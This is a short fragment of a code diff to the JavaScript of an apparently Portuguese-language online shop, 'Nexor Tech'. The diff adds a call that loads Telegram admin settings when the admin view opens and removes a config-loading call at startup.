   document.getElementById('view').innerHTML = (VIEWS[state.view]||viewHome)();
   if(state.view==='checkout'&&state.pixAtivo) iniciarMonitor();
+  if(state.view==='admin'&&state.admin&&!state.tgLoaded) carregarTgAdmin();
   const m = menuAtual();
   document.title = state.view==='prod'&&byId(state.pid) ? byId(state.pid).n+' — Nexor Tech'
     : m ? m.t+' — Nexor Tech' : 'Nexor Tech — Presentes e ofertas';
@@ -1364,7 +1290,6 @@ document.addEventListener('click', e=>{ if(!e.target.closest('.searchpill')) doc
   tratarHash();
   if(state.session&&!state.recovery) await carregarUsuario();
   renderAcc(); renderChips(); render();
-  carregarConfig();
   carregarProdutos();
 })();
 </script>
